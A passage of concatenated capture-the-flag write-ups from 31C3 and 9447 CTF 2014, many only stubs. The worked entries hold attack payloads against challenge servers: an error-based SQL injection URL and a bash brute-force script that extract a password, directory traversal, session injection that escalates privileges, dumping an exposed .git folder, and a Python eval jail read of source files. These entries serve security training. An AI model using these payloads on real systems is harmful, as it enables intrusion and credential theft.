This is the column we need to extract the password from. So let’s do that:

```
http://188.40.18.70/PROFILE/55%5C/||extractvalue%283,concat%280x7e,%28select%09concat_ws%280x3a,Us3rN4m3,P4sWW0rD_0F_M3_WTF%29%09from%09users%09limit%091,1%29%29%29--%09
```

This gives us:

```
XPATH syntax error: '~Dracula:ZD456ddssd65456lksndoiN'
```

But when we try to log in with the password it doesn’t work. Maybe the error does not show all the chars from the password? We need to bruteforce the rest of the password with `locate()`. Here is a quick script that does just that:

```bash
#!/usr/bin/env bash
str='ZD456ddssd65456lksndoiNzd654sdsd'
while :; do
  a=0;
  echo "New string: $str";
  for i in {a..z}; do
    wget --quiet -O $i 'http://188.40.18.70/PROFILE/55%5C/||extractvalue%283,concat%280x3a,%28select%0Blocate("'$str$i'",P4sWW0rD_0F_M3_WTF)%0Bfrom%0Busers%0Blimit%0B1,1%29%29%29--%0B'
    if grep ":1" $i; then
      str=$str$i
      a=1;
      echo "$str";
    fi;
  done;
  if [ $a==1 ]; then
    for i in {0..9}; do
      wget --quiet -O $i 'http://188.40.18.70/PROFILE/55%5C/||extractvalue%283,  concat%280x3a,%28select%0Blocate("'$str$i'",  P4sWW0rD_0F_M3_WTF)%0Bfrom%0Busers%0Blimit%0B1,1%29%29%29--%0B'
      if grep ":1" $i; then
        str=$str$i
        a=1
        echo "$str";
      fi;
    done;
  fi;
  if [ $a -eq 0 ]; then
    echo "PWD:$str"
    exit;
  fi;
done;
```

This gives us Dracula’s full account password:

```
Username: Dracula
Password: ZD456ddssd65456lksndoiNzd654sdsd654zd65s4d56489zdz
```

After logging in, we found a directory traversal vulnerability that lets us understand that there is another site on the server as mentioned in the challenge description. This source code is different from the original site in `/var/www/html`. The URL
<http://188.40.18.70/ACCESS?action=browse&dir=../../../../../home/devilish.local> reveals the following files:

```
.htaccess
conf.php
images
index.php
__WebSiteFuckingPrivateContentNotForPublic666+666
style.css
```

We can also see the code source of some pages. For example, <http://188.40.18.70/__WebSiteFuckingPrivateContentNotForPublic666/LOGIN_HEAD> reveals the following code:

```php
<?php
 if(@$_SESSION['user']){header("location: ".$LINK);die();}
 if(isset($_POST['user'])){
  if(mysqli_num_rows(mysqli_query($con,"SELECT * FROM users WHERE Us3rN4m3='".mysqli_real_escape_string($con,@$_POST['user'])."' AND P4sWW0rD_0F_M3_WTF='".mysqli_real_escape_string($con,@$_POST['pass'])."' "))>0){
   $_SESSION=$_POST;
   header("location: ".$LINK);die();
  }else{
   $Error=1;
  }
 }
?>
```

And here is the `LOGIN_HEAD` from `devilish.local`:

```php
<?php
  if (@$_SESSION['is_ExclusiveMember']){header("location: ".$LINK);die();}
  if (isset($_POST['user'])){
    if (@$_POST['user']===$uLOGIN && @$_POST['pass']===$uPASSWORD){
      $_SESSION['is_ExclusiveMember']=1;
      header("location: ".$LINK);
      die();
    } else{
      $Error=1;
    }
  }
?>
```

We somehow need to access the second web site. The easiest way to do this is by adding this line to your local `/etc/hosts` file:

```bash
188.40.18.70 devilish.local
```

Now you can browse to <http://devilish.local/>. The source code for its `INDEX` page contains the following:

```php
<?php echo($logged?"Here's your secret ".$flag."":"Login to access the secret")?>
```

However, this website lacks login functionality. Maybe the two websites use the same session? Let’s go back to the first site and log in but this time we send the parameter `is_ExclusiveMember=1` in the `POST` request. Remember the code above that showed us:

```php
$_SESSION=$_POST;
```

So we use Firefox’s [Firefox Hackbar](https://addons.mozilla.org/fr/firefox/addon/hackbar/) and send this:

```
url: http://188.40.18.70/LOGIN
post: is_ExclusiveMember=1&pass=ZD456ddssd65456lksndoiNzd654sdsd654zd65s4d56489zdz&user=Dracula
```

Once we’re logged in on the first website, visiting the second website reveals a message:

```
This is the private Portal of us

If you are accessing this page this means you are one of the very few exclusive members who are allowed to come in here!

Here's your secret
31c3_Th3r3_4R3_D3v1li5h_Th0ght5_ev3N_1N_th3_M0sT_4ng3l1c_M1nd5
```

The flag is `31c3_Th3r3_4R3_D3v1li5h_Th0ght5_ev3N_1N_th3_M0sT_4ng3l1c_M1nd5`.

## Other write-ups and resources

* <http://0xboogy.blogspot.com/2014/12/31c3ctf-devilish-writeup.html>
* <http://l4w.io/2014/12/31c3-ctf-writeups/>
* <http://kitctf.de/writeups/31c3-ctf/devilish/>
* <http://tasteless.eu/2014/12/31c3-ctf-devilish-writeup/>
# 31C3 CTF 2014: http

**Category:** web
**Points:** 15
**Solves:** 86
**Description:**

> Check out our cool webserver. It is really fast because it is implemented in C. For security we use the versatility of Ruby.
>
> Get the source at: [`http.tar.bz2`](http.tar.bz2)
>
> Some example sites hosted with our webserver:
> - [http://works.90.31c3ctf.aachen.ccc.de/works.html](http://works.90.31c3ctf.aachen.ccc.de/works.html)
> - [http://31c3ctf.90.31c3ctf.aachen.ccc.de/announcements.html](http://31c3ctf.90.31c3ctf.aachen.ccc.de/announcements.html)

## Write-up

(TODO)

## Other write-ups and resources

* <http://l4w.io/2014/12/31c3-ctf-writeups/>
* <http://www.crimsonagents.com/2014/12/31c3ctf-web-http.html>
# 31C3 CTF 2014: Page Builder

**Category:** web
**Points:** 20
**Solves:** 11
**Description:**

> These guys have ripped off our designs and using them in their web pages builder! We’d Haxx them, don’t worry we’ll give you decent points for it.
> <http://188.40.18.76/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.tyage.net/?p=829>
* <http://tasteless.eu/2014/12/31c3-ctf-page-builder-writeup/>
# 31C3 CTF 2014: pCRAPp

**Category:** web
**Points:** 10
**Solves:** 101
**Description:**

> PHP is nasty crappy sometimes, just pwn it
> <http://188.40.18.69/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://l4w.io/2014/12/31c3-ctf-writeups/>
# 9447 CTF 2014: bashful

**Category:** Web
**Points:** 101
**Solves:** 157
**Description:**

> You think that was too easy? Well it was actually harder than I thought, so I made it simple again…
>
> [bashful.9447.plumbing](http://bashful.9447.plumbing/)

## Write-up

**Note:** This challenge is an easier version of [the _tumorous_ challenge](https://github.com/ctfs/write-ups/tree/master/9447-ctf-2014/tumorous#readme).

The page at <http://bashful.9447.plumbing/> contains:

> 13/2/2004: I learned how to html, yay!
> 12/4/2004: I learned how to use git, yay!
> 13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon.
> 08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it.
> 10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh.
> 10/9/2004: I can't forget my token. What do I do? I should also pack so I'm ready to leave soon.
> 11/9/2004: I panicked and deleted the token. It is the work of evil doers.
> 12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.

The second line hints at Git, so let’s try visiting <http://bashful.9447.plumbing/.git/>. This page contains the directory listing for the `.git` folder. Let’s download it:

```bash
$ wget -r -nH -e html_extension=Off --reject '*.html*' 'http://bashful.9447.plumbing/.git/'
```

Since we only have the `.git` folder but not the actual source files, this is a _bare_ Git repository. Luckily, the source files can be restored:

```bash
$ git checkout -f

$ ls
index.html token

$ cat token
9447{I_JUST_THINK_BITCOIN_WILL_DIE_OUT_SOON}
```

The flag is `9447{I_JUST_THINK_BITCOIN_WILL_DIE_OUT_SOON}`.

### Alternate solution

[`.git/logs/HEAD`](http://bashful.9447.plumbing/.git/logs/HEAD) contains:

````
0000000000000000000000000000000000000000 3c4992205aba2077cbf87fc7cde900fabecd1140 root <root@ip-172-31-10-205.ap-southeast-2.compute.internal> 1412673432 +0000commit (initial): Hurr durr
3c4992205aba2077cbf87fc7cde900fabecd1140 ec972f9af79a09129021a30e7f08099aa2b8a81d John Doe <fsck@you.me> 1412673456 +0000	commit (amend): Hurr durr
ec972f9af79a09129021a30e7f08099aa2b8a81d 0b4d6fe0adf809c4e7b7a0d47132600b68f79fda root <root@ip-172-31-10-205.ap-southeast-2.compute.internal> 1417230572 +0000commit: My precious flag now exists
````

So, someone committed the flag, but they’ve probably deleted it in a later commit. Let’s look at the `.git/objects` directory to see if any commit objects can be found. There don’t seem to be any. The CTF organizers might have [packed](http://git-scm.com/book/en/v2/Git-Internals-Packfiles) the commit objects. Let’s look at `.git/objects/info/packs`:

```
I banish thee, evil mind readers from planet Zblaargh.
```

In the initial version of the challenge we were supposed to find the pack file name on our own by directly entering its URL. Pack file names are of the format `pack-${SHA1}.{pack,idx}` where `${SHA1}` is a hash of the sorted object names to make the resulting filename based on the pack content.

Unfortunately there was no (?) way to find out the object name of the token file without knowing the token itself. Anyhow, no team could solve this challenge at that difficulty level. And that’s why the organizers reduced the complexity from 310 to 101 points and made the directories browseable.

Okay, maybe we can just fetch the pack file from the packs directory. Let’s browse to `.git/objects/pack/`:

````
pack-deff83d57714493c6d317394f3542da8e396f887.idx
pack-deff83d57714493c6d317394f3542da8e396f887.pack
````

Fine, let’s download these files and unpack them. An easy way to do this is explained in [this Stack Overflow answer](http://stackoverflow.com/a/3333428/96656).

After unpacking, `git status` shows:

````
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	deleted:    index.html
	deleted:    token
````

The next part is simple:

````
$ git checkout token

$ cat token
9447{I_JUST_THINK_BITCOIN_WILL_DIE_OUT_SOON}
````

## Other write-ups and resources

* <https://github.com/hypnosec/writeups/blob/master/2014/9447-ctf/web/bashful.md>
* <http://tasteless.eu/2014/12/9447-security-society-ctf-2014-bashful-and-coffee-writeup/>
* <https://ucs.fbi.h-da.de/writeup-9447-bashful/>
# 9447 CTF 2014: blockchain

**Category:** Reversing
**Points:** 490
**Solves:** 9
**Description:**

> We managed to recover this datafile from our top-secret agent’s laptop. He was trying to send us a message, see if you can work it out!
>
> [`blockchain.tar.gz`](blockchain.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/reversing/blockchain/blockchain.md>
# 9447 CTF 2014: booty

**Category:** Exploitation
**Points:** 230
**Solves:** 42
**Description:**

> Ahoy thar buckos! Do you have what it takes t’ become t’ new PIRATE KING? Prove your strength by defeatin’ all challengers in a mighty arm wrestle! If ye succeed then claim ye treasure map ’n search fer th’ hidden booty!
>
> ip: booty.9447.plumbing
> port: 9447
>
> [`booty`](booty)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by VulnHub CTF team](https://ctf-team.vulnhub.com/9447-ctf-2014-booty/)
* <http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty/>
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/booty/booty.md>
# 9447 CTF 2014: classy

**Category:** Exploitation
**Points:** 420
**Solves:** 9
**Description:**

> I'll have a small flat white, cheers mate!
>
> address: classy.9447.plumbing
> port: 9447
>
> [`classy`](classy)
> [`libc-2.19.so`](libc-2.19.so)

## Write-up

(TODO)

## Other write-ups and resources

* <http://lovelydream.gitcafe.com/2014/12/02/classy/>
* [Write-up + exploit by Ricky Zhou](https://rzhou.org/~ricky/9447_2014/classy/exploit.py)
* [Chinese](http://ddaa.logdown.com/posts/245329-9447-ctf-2014-pwn-420-classy)
# 9447 CTF 2014: coffee

**Category:** Web
**Points:** 120
**Solves:** 45
**Description:**

> You’re a hipster, and as such are too good for a job. You do however, need your grande decaf hazelnut soy latte — stat! Acquire some coffee without resorting to selling one of your vintage vinyls.
>
> The URL for the coffee ordering site is: <http://coffeeio.9447.plumbing/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/12/9447-security-society-ctf-2014-bashful-and-coffee-writeup/>
# 9447 CTF 2014: coor coor

**Category:** Misc
**Points:** 400
**Solves:** 18
**Description:**

> A 9447 CTF organizer is giving away flags to friends that he trusts. This [memory dump](https://mega.co.nz/#!j1523QbI!8yGkA4_M7bgea4H4sbqdxTgwgielAUWPGK3a3cMve_w) was taken off a competitor’s computer after a raid by the pwnpolice.
>
> You’re desperate for points, and so decide to acquire a flag from the rogue organizer.

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by @bernardomr](http://w00tsec.blogspot.com/2014/11/9447-2014-ctf-write-up-coor-coor.html)
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/misc/coor_coor/coor_coor.md>
# 9447 CTF 2014: doom6

**Category:** Misc
**Points:** 250
**Solves:** 19
**Description:**

> Axel Gembe is at it again. This time he's got his hands on Doom6, fresh off the alpha shelf at EA studios. Beat the game to complete the challenge.
>
> **Usage:**
>
> ```
> sh run_osx.sh doom6.9447.plumbing 9447
> sh run_linux.sh doom6.9447.plumbing 9447
> run_windows.bat doom6.9447.plumbing 9447
> ```
>
> [`doom6.zip`](doom6.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 9447 CTF 2014: europe01

**Category:** Exploitation
**Points:** 200
**Solves:** 43
**Description:**

> My friend Eve made this program for me to broadcast a key to my friends. However I’m pretty sure she put in a vulnerability. Can you find it?
>
> Submit flag01 here
>
> IP: europe.9447.plumbing
> Port: 9447
>
> [`europe`](europe)
>
> ```bash
> $ ls
> europe flag01 flag02 passwd salt
> ```
>
> **Hint!** If you’re getting crashes running europe, it’s trying to open some files you don’t have.
> Also, concurrent logins seem to cause some problems


## Write-up

(TODO)

## Other write-ups and resources

* [Write-up + exploit by Ricky Zhou](https://rzhou.org/~ricky/9447_2014/europe/exp1.py) or [here](https://github.com/pwning/public-writeup/tree/master/9447ctf2014/exploitation/europe/exp1.py)
* [Write-up + exploit by saelo](http://kitctf.de/writeups/9447ctf2014/2014/12/01/europe-writeup/)
# 9447 CTF 2014: europe02

**Category:** Exploitation
**Points:** 120
**Solves:** 41
**Description:**

> Submit flag02 here
>
> IP: europe.9447.plumbing
> Port: 9447
>
> [`europe`](europe)
>
> **Hint!**
>
> ```bash
> $ ls
> europe flag01 flag02 passwd salt
> ```
>
> **Hint!** If you’re getting crashes running europe, it’s trying to open some files you don’t have.
> Also, concurrent logins seem to cause some problems

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up + exploit by Ricky Zhou](https://rzhou.org/~ricky/9447_2014/europe/exp2.py) or [here](https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/europe/exp2.py)
* [Write-up + exploit by saelo](http://kitctf.de/writeups/9447ctf2014/2014/12/01/europe-writeup/)
# 9447 CTF 2014: europe03

**Category:** Exploitation
**Points:** 380
**Solves:** 27
**Description:**

> Submit flag03 here. It is in `/home/ctf/`
>
> IP: europe.9447.plumbing
> Port: 9447
>
> [`europe`](europe)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up + exploit by Ricky Zhou](https://rzhou.org/~ricky/9447_2014/europe/exp3.py) or [here](https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/europe/exp3.py)
* [Write-up + exploit by saelo](http://kitctf.de/writeups/9447ctf2014/2014/12/01/europe-writeup/)
# 9447 CTF 2014: fuckpyjails

**Category:** Exploitation
**Points:** 150
**Solves:** 30
**Description:**

> Remote Code Execution As A Service
>
> fuckpyjails.9447.plumbing:9447
>
> **Hint!** key == flag

## Write-up

```bash
$ nc fuckpyjails.9447.plumbing 9447
>>> 1+1
Fail!

$ nc fuckpyjails.9447.plumbing 9447
>>> x
Traceback (most recent call last):
  File "/home/ctf/fuckpyjails.py", line 18, in <module>
    if get_key() is eval(raw_input()):
  File "<string>", line 1, in <module>
NameError: name 'x' is not defined
```

It seems our input is evaluated. Its result is then compared to the return value of the `get\_key()` function. Any exceptions are displayed along with a stack trace; the line on which the error occurs is printed as well. Let’s try to view the source code for this challenge located at `/home/ctf/fuckpyjails.py`:

```bash
$ nc fuckpyjails.9447.plumbing 9447
>>> open('/home/ctf/fuckpyjails.py').read()
Fail!
```

This fails because `open('/home/ctf/fuckpyjails.py').read()` evaluates to a string that is not equal to the expected key. How can we get the string to be printed, though? Just trigger an error or exception of some sort, keeping in mind only a single line of code is printed at a time:

```bash
$ nc fuckpyjails.9447.plumbing 9447
>>> eval(open('/home/ctf/fuckpyjails.py').read().encode('hex'))
Traceback (most recent call last):
  File "/home/ctf/fuckpyjails.py", line 18, in <module>
    if get_key() is eval(raw_input()):
  File "<string>", line 1, in <module>
  File "<string>", line 1
    23212f7573722f62696e2f656e7620707974686f6e0a696d706f7274207379730a696d706f727420736f636b65740a696d706f7274207265736f757263650a0a7265736f757263652e736574726c696d6974287265736f757263652e524c494d49545f4e50524f432c2028302c203029290a0a646566206765745f6b657928293a0a0973203d20736f636b65742e736f636b657428736f636b65742e41465f554e49582c20736f636b65742e534f434b5f53545245414d290a09732e636f6e6e65637428222f6b657973657276657222290a0972203d20732e72656376283634290a09732e636c6f736528290a0972657475726e20720a0a7379732e7374646f75742e777269746528223e3e3e2022290a7379732e7374646f75742e666c75736828290a0a6966206765745f6b65792829206973206576616c287261775f696e7075742829293a0a097072696e74202244696420796f752067657420746865206b65793f220a656c73653a0a097072696e7420224661696c21220a

SyntaxError: unexpected EOF while parsing
```

This gives us the hex-encoded version of the challenge’s source code. Let’s decode it and save it as [`fuckpyjails.py`](fuckpyjails.py):

```bash
$ xxd -r -p <<< '23212f7573722f62696e2f656e7620707974686f6e0a696d706f7274207379730a696d706f727420736f636b65740a696d706f7274207265736f757263650a0a7265736f757263652e736574726c696d6974287265736f757263652e524c494d49545f4e50524f432c2028302c203029290a0a646566206765745f6b657928293a0a0973203d20736f636b65742e736f636b657428736f636b65742e41465f554e49582c20736f636b65742e534f434b5f53545245414d290a09732e636f6e6e65637428222f6b657973657276657222290a0972203d20732e72656376283634290a09732e636c6f736528290a0972657475726e20720a0a7379732e7374646f75742e777269746528223e3e3e2022290a7379732e7374646f75742e666c75736828290a0a6966206765745f6b65792829206973206576616c287261775f696e7075742829293a0a097072696e74202244696420796f752067657420746865206b65793f220a656c73653a0a097072696e7420224661696c21220a' > fuckpyjails.py
```

(TODO)

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-9447-fuckpyjails/>
* <http://blog.germano.io/2014/fuckpyjails-writeup-9447-ctf/>
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/fuckpyjails/fuckpyjails.txt>
# 9447 CTF 2014: future

**Category:** Misc
**Points:** 50
**Solves:** 53
**Description:**

> 2400:6180:0000:00d0::0264:7001
>
> **Hint!** It is thought that more than one layer of communication is different in the future…
>
> **Hint:** The future uses a reliable message-oriented transport for their communication — no streams-of-octets peasantry!
>
> **Hint!** We have learned that people of the future really like small numbers…
>
> **Hint!** Time-travel scientists have discovered the future people call their magic space-communication funny words like ‘IPv6’ and ‘SCTP’. If only we could establish contact with these strange beings…

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/12/9447-security-society-ctf-2014-future-and-shmap-writeup/>
* [Solution by @auscompgeek](https://gist.github.com/auscompgeek/a4390fb82a31ce69256b)
* <http://blog.dul.ac/2014/12/9447CTF14/>
# 9447 CTF 2014: geocap

**Category:** Misc
**Points:** 213
**Solves:** 27
**Description:**

> Some say modern rap lyrics contain hidden messages, but who knows these things…
>
> [`geocap.pcapng`](geocap.pcapng)
>
> **Hint!** If you want a job done right, do it yourself.
>
> **Hint!** Do not look at the packets. The packets are a lie.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/misc/geocap/geocap.md>
# 9447 CTF 2014: hellomike

**Category:** Reversing
**Points:** 400
**Solves:** 4
**Description:**

> The flag is `9447{$STR}` where `$STR` is the shortest string that is accepted by this binary. If multiple accepted strings have the same length, you must use the lexicographically least such string.
>
> [`hellomike.beam`](hellomike.beam)
>
> **Hint:** <https://www.youtube.com/watch?v=uKfKtXYLG78>

## Write-up

(TODO)

## Other write-ups and resources

* <https://medium.com/@shanewilton/9447-ctf-2014-hellomike-writeup-ba812f012d5>
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/reversing/hellomike/hellomike.md>
# 9447 CTF 2014: insanity_check

**Category:** Reversing
**Points:** 1
**Solves:** 521
**Description:**

> Congrats, you can read!
>
> [`insanity`](insanity)

## Write-up

```bash
$ strings insanity | grep 9447
9447{This_is_a_flag}
```

The flag is `9447{This_is_a_flag}`.

## Other write-ups and resources

* <http://nandynarwhals.org/2014/12/02/9447-ctf-2014-insanity_check-reversing/>
* <http://theevilbit.blogspot.com/2014/12/9447-ctf-2014-writeup-reversing-125100.html>
# 9447 CTF 2014: johnlions

**Category:** Exploitation
**Points:** 250
**Solves:** 28
**Description:**

> telnet johnlions.9447.plumbing
> login ctf
>
> **Hint!** If you’re not familiar with UNIX, check out <http://www.lemis.com/grog/Documentation/Lions/book.pdf> :P
>
> **Hint!** With a million ways to get root, remember some are much simpler than others…

## Write-up

```bash
$ telnet johnlions.9447.plumbing
Trying 54.148.182.249...
Connected to johnlions.9447.plumbing.
Escape character is '^]'.
login: ctf
$ ls -lsa
total 134
   1 drwxrwxr-x 9 root      272 Sep 22 06:38 .
   1 drwxrwxr-x 9 root      272 Sep 22 06:38 ..
   5 drwxrwxr-x 2 bin      2512 Sep 22 06:38 bin
  18 -rwxr-xr-x 1 bin      8986 Jun  8  1979 boot
   1 drwxrwxr-x 2 bin       208 Sep 22 05:56 dev
   1 drwxrwxr-x 2 bin       336 Sep 22 06:24 etc
   1 -r-------- 1 root       28 Sep 22 06:25 flag
   1 drwxrwxr-x 2 bin       320 Sep 22 05:33 lib
   1 drwxrwxr-x 2 root       96 Sep 22 05:46 mdec
   1 drwxrwxrwx 2 root      112 Sep 22 06:36 tmpc
 102 -rwxr-xr-x 1 root    51982 Jun  8  1979 uniax
   1 drwxrwxr-x12 root      208 Sep 22 05:58 ustr
```

## Other write-ups and resources

* [Write-up by hypnosec](https://github.com/hypnosec/writeups/blob/master/2014/9447-ctf/exploitation/johnlions.md)
* <https://github.com/rick2600/writeups/blob/master/9447CTF_2014/johnlions.md>
* [Write-up + exploit by Ricky Zhou](https://rzhou.org/~ricky/9447_2014/johnlions/)
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/johnlions/johnlions.md>
# 9447 CTF 2014: no strings attached

**Category:** Reversing
**Points:** 25
**Solves:** 166
**Description:**

> [`no_strings_attached`](no_strings_attached)

## Write-up

We are given an Intel 32-bit executable, not stripped.

Running the binary yields following prompt and requests us for an authentification code:

![](prompt.png)

We can decompile the code in Intel syntax using `objdump -D -M intel no_strings_attached` and find the main calling a suspicious function, `authenticate`:


```nasm
080487a9 <main>:
 80487a9:	55                   	push   ebp
 80487aa:	89 e5                	mov    ebp,esp
 80487ac:	83 e4 f0             	and    esp,0xfffffff0
 80487af:	83 ec 10             	sub    esp,0x10
 80487b2:	c7 44 24 04 e4 8b 04 	mov    DWORD PTR [esp+0x4],0x8048be4
 80487b9:	08 
 80487ba:	c7 04 24 06 00 00 00 	mov    DWORD PTR [esp],0x6
 80487c1:	e8 7a fd ff ff       	call   8048540 <setlocale@plt>
 80487c6:	e8 39 fe ff ff       	call   8048604 <banner>
 80487cb:	e8 73 fe ff ff       	call   8048643 <prompt_authentication>
 80487d0:	e8 33 ff ff ff       	call   8048708 <authenticate> ; <----
 80487d5:	b8 00 00 00 00       	mov    eax,0x0
 80487da:	c9                   	leave  
 80487db:	c3                   	ret 
```

This `authenticate` later calls a `decrypt` function:

```nasm
08048708 <authenticate>:
 8048708:	55                   	push   ebp
 8048709:	89 e5                	mov    ebp,esp
 804870b:	81 ec 28 80 00 00    	sub    esp,0x8028
 8048711:	c7 44 24 04 90 8a 04 	mov    DWORD PTR [esp+0x4],0x8048a90
 8048718:	08 
 8048719:	c7 04 24 a8 8a 04 08 	mov    DWORD PTR [esp],0x8048aa8
 8048720:	e8 33 ff ff ff       	call   8048658 <decrypt> ; <----
 8048725:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
```
Let's jump to the state after the `decrypt` function call using `gdb`!

![](registers.png)

Since return values and pointers to memory, where values are located, is saved in the EAX register - as by [x86 C convention](http://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions#CDECL), it is always a good guess to look at the content of this register:

![](eax_content.png)

The content looks like a hexadecimal ASCII string, let's extract it and convert it to a readable character string:


```
$ echo '393434377b796f755f6172655f616e5f696e7465726e6174696f6e616c5f6d7973746572797d' | gsed 's/\\x//g' | xxd -r -p
9447{you_are_an_international_mystery}
```

The flag is `9447{you_are_an_international_mystery}`.

## Other write-ups and resources

* <http://theevilbit.blogspot.com/2014/12/9447-ctf-2014-writeup-reversing-125100.html>
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/reversing/no_strings_attached/no_strings_attached.md>
# 9447 CTF 2014: nosql

**Category:** Misc
**Points:** 160
**Solves:** 65
**Description:**

> Hey, I don’t understand how SQL works so I made my own NoSQL startup. And OpenSSL is bloody crap.
>
> ip: 54.148.249.150
> port: 4479
>
> [`nosql.tar.gz`](nosql.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/12/9447-ctf-2014-nosql/>
* <http://blog.dul.ac/2014/12/9447CTF14/>
# 9447 CTF 2014: polydata

**Category:** Misc
**Points:** 270
**Solves:** 46
**Description:**

> polydata.9447.plumbing:13371

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/misc/polydata/polydata.md>
# 9447 CTF 2014: ramble

**Category:** Web
**Points:** 200
**Solves:** 58
**Description:**

> [travels of a lonely cloud](http://ramble.9447.plumbing:8888/)
>
> [`server.js`](server.js)
>
> **Hint!** JS has interesting scoping properties…

## Write-up

[The website](http://ramble.9447.plumbing:8888/) is a photolog, available in two languages. The URL parameter `?lang=en_US` is the implied default; `?lang=fr_FR` is the other option.

[The provided source code](server.js) contains some filtering logic that is intended to prevent the use of other locales.

[The `filterOptions` function](https://github.com/ctfs/write-ups/blob/master/9447-ctf-2014/ramble/server.js#L56-L83) iterates over each URL parameter (sorted lexicographically), and calls `filterValidLanguages()` if the parameter name lowercases to `'lang'`:

```js
function filterOptions(params) {
  var options = {}

  var sorted_param_names = Object.keys(params).sort();
  var params_processed = 0;
  for (i = 0; i < sorted_param_names.length; i++) {
    var lowered = sorted_param_names[i].toLowerCase();

    if (lowered == 'lang') {
      filterValidLanguages(params, lowered);
      options['lang'] = params[sorted_param_names[i]];
      params_processed++;
    // } else if (lowered == 'paginationnumposts') {
    //   param = params[sorted_param_names[i]];
    //   if (parseInt(param) > 0) {
    //     options['pagination_num_posts'] = parseInt(param);
    //     params_processed++;
    //   }
    } else {
      // Track user activity, so we can see where they go
      options['usertoken'] = params[sorted_param_names[i]];
      params_processed++;
    }

    if (params_processed >= 3) return options;
  }
  return options;
}
```

Note that he variable `i` is never declared using `var`; it is an implicit global variable.

`filterValidLanguages` makes use of the same implicit global variable `i`:

```js
function filterValidLanguages(params, param_name) {
  // Russian doesn't work on this server for some reason?
  // LANGUAGES = ['fr_FR', 'en_US', 'ru_RU']
  var LANGUAGES = ['fr_FR', 'en_US']
  for (i = 0; i < LANGUAGES.length; i++) {
    if (params[param_name] == LANGUAGES[i]) return;
  }
  params[param_name] = 'en_US';
  return;
}
```

This presents a subtle vulnerability: at the start of the first loop iteration in `filterOptions`, `i` equals `0`. If, after sorting the URL parameter names lexicographically, the first URL parameter name lowercases to `'lang'`, the `if (lowered == 'lang')` branch is entered, and the following code is run:

```js
filterValidLanguages(params, lowered);
// Note: from now on, `i` is `2` instead of `0`!
options['lang'] = params[sorted_param_names[i]];
params_processed++;
```

After the `filterValidLanguages` call, the value of `i` is `2`, although the code expects it to be the same value it had before (`0` in this case). So, the value stored in `options['lang']` is not the value for the URL parameter, but rather the value for the third URL parameter name in the sorted list.

This means we can bypass the “valid language” filter, and set the language to any value we like, e.g. `ru_RU.UTF-8`, by constructing a query string similar to this:

```
?lang=x&y=a&z=ru_RU.UTF-8
```

[The `getPosts` function](https://github.com/ctfs/write-ups/blob/master/9447-ctf-2014/ramble/server.js#L85-L118) assigns the language (which we can now control) to the `LC_ALL` environment variable, and spawns a shell that executes `ls -l $some_hardcoded_directory_value_we_cannot_control`. Could this be a case of [Shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29#Initial_report_.28CVE-2014-6271.29)?

Below are some possible ways to successfully exploit this challenge.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/9447-security-society-ctf-2014-ramble-writeup/>
* [Exploit by Ymgve that leaks `/flag` piece by piece](https://gist.github.com/anonymous/fa48e7657ddf9d4f9d6d)
* [Exploit by HoLyVieR using a timing attack + blind Shellshock injection](https://gist.github.com/jghkdgha/0a40941cdb072bfe269f)
* [Exploit by cyberguru - execute command with one query](http://pastebin.com/nGGTNt6K)
# 9447 CTF 2014 write-ups

* <https://9447.plumbing/>
* [Scoreboard](https://9447.plumbing/scores) or [local alternative](scoreboard.txt)
* [@9447CTF on Twitter](https://twitter.com/9447CTF)
* [Number of solves per task](solves.txt)

## Info

Flags are of the format `9447{[0-9a-zA-Z_]+}`. Please submit the entire flag, including `9447{}`.

## Completed write-ups

* [bashful](bashful)
* [insanity\_check](insanity_check)
* [no strings attached](no-strings-attached)
* [ramble](ramble)
* [tumorous](tumorous)

## External write-ups only

* [blockchain](blockchain)
* [booty](booty)
* [classy](classy)
* [coffee](coffee)
* [coor coor](coor-coor)
* [europe01](europe01)
* [europe02](europe02)
* [europe03](europe03)
* [fuckpyjails](fuckpyjails)
* [future](future)
* [geocap](geocap)
* [hellomike](hellomike)
* [johnlions](johnlions)
* [nosql](nosql)
* [polydata](polydata)
* [rolling](rolling)
* [securestore](securestore)
* [shmap](shmap)

## Missing write-ups

* [doom6](doom6)
# 9447 CTF 2014: rolling

**Category:** Reversing
**Points:** 100
**Solves:** 118
**Description:**

> Rolling your own stuff is pretty good :)
>
> The flag format is `9447{$STR}`, where `$STR` is the one accepted by the binary.
>
